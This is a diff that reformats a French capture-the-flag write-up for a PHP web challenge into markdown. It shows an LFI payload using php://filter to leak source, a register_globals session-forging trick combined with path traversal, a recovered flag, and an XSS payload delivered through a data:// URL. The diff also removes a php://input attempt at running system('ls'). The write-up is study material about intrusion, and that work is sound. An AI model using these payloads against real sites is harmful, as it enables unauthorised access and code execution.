@@ -1,8 +1,7 @@
------------------------------------------------------------
-LFI : ajax.php?load=php://filter/convert.base64-encode/resource=admin
------------------------------------------------------------
+## LFI : ajax.php?load=php://filter/convert.base64-encode/resource=admin
+```php
 ajax
-<?php 
+<?php
 
 if (isset($_GET['load']) && !empty($_GET['load'])) {
 	if (is_string($_GET['load']))
@@ -25,10 +24,11 @@ function get_flag() {
 web6.ese.crashlab.org/db.sqlite~  Nope
 web6.ese.crashlab.org/db.sqlite Nope
 ?>
-
+```
 
 http://web6.ese.crashlab.org/ajax.php?load=php://filter/convert.base64-encode/resource=admin
 view-source:web6.ese.crashlab.org/ajax.php?load=admin
+```php
 <?php
 
 require 'functions.php';
@@ -50,23 +50,13 @@ else {
 
 ?>
 
+```
 
 
-
-
-
-
-
-
-
-
-
------------------------------------------------------------
-Register Global
------------------------------------------------------------
+## Register Global
 view-source:web6.ese.crashlab.org/ajax.php?load=common
 ?
-
+```php
 <?php
 require 'common.php';
 ?>
@@ -86,12 +76,15 @@ if (isset($lang) && !empty($lang)) {
 	if (file_exists("lang/$lang.php"))
 		include "lang/$lang.php";
 	else
-		include "lang/en.php";	
+		include "lang/en.php";
 } else {
 	include "lang/en.php";
 }
 
 ?>
+```
+
+```
 web6.ese.crashlab.org/common.php?_SESSION['auth']='true'
 web6.ese.crashlab.org/common.php?_SESSION['auth']='true'
 ?_SESSION['auth']='true'
@@ -107,16 +100,19 @@ http://127.0.0.1/?_SESSION.auth=true
 http://127.0.0.1/?_SESSION->auth=true
 127.0.0.1/?_SESSION%3D%3Eauth=true
 127.0.0.1/?_SESSION=>auth=true
-web6.ese.crashlab.org/admin.php?_SESSION%5Bauth%5D=true -> array(1) { ["auth"]=> string(4) "true" } 
+web6.ese.crashlab.org/admin.php?_SESSION%5Bauth%5D=true -> array(1) { ["auth"]=> string(4) "true" }
 				echo $_SESSION['auth'];
 
 Bon payload:
-?_SESSION%5Bauth%5D=true 
-et 
+?_SESSION%5Bauth%5D=true
+et
 echo "true"==true;   => 1
+```
 
+```
 http://web6.ese.crashlab.org/common.php?lang=../admin&_SESSION%5Bauth%5D=true
 ese{facile_Ou_Pas?}
+```
 
 
 
@@ -125,11 +121,9 @@ ese{facile_Ou_Pas?}
 
 
 
-
-Write up:
----------
+## Methodologie Write up:
 REGARDER le code source pour trouver les fichiers AJAX intéressants
-LFI pour avoir le code source : ajax.php?load=php://filter/convert.base64-encode/resource=admin , common, index, etc
+LFI pour avoir le code source : ajax.php?load=php://filter/convert.base64-encode/resource=admin , common, index, etc   
 REGISTER GLOBAL pour définir les variables lang et SESSION   :  lang=../admin&_SESSION%5Bauth%5D=true
 LFI pour inclure la page et que la variable session soit injectée dans admin.php
 REGISTER GLOBAL pour être connecté avec la session car echo "true"==true;   => 1 dans PHP, et [] encodé
@@ -137,20 +131,9 @@ Flag : ese{facile_Ou_Pas?}
 
 
 
-
-
-
-
-Filter failed
--------------
-Phar, Zip..
-http://web6.ese.crashlab.org/ajax.php?load=compress.zlib://admin.php.gz
-input
-web6.ese.crashlab.org/ajax.php?load=php://input&a=system&b=ls
-web6.ese.crashlab.org/ajax.php?load=php://input
-<? system('ls'); ?>
-<? echo "test"; ?>
-
+### Fun
+```
 v1 Fun :p EDIT: Fixed
 -------------------
 http://web6.ese.crashlab.org/ajax.php?load=data://text/plain,,%3Chtml%3E%3Csvg%20onload=alert%28String.fromCharCode%2887,104,121,32,117,32,100,111,32,100,105,115,32,33,32,71,105,109,109,101,32,100,97,32,102,108,97,103%29%29%3E%3C!--
+```
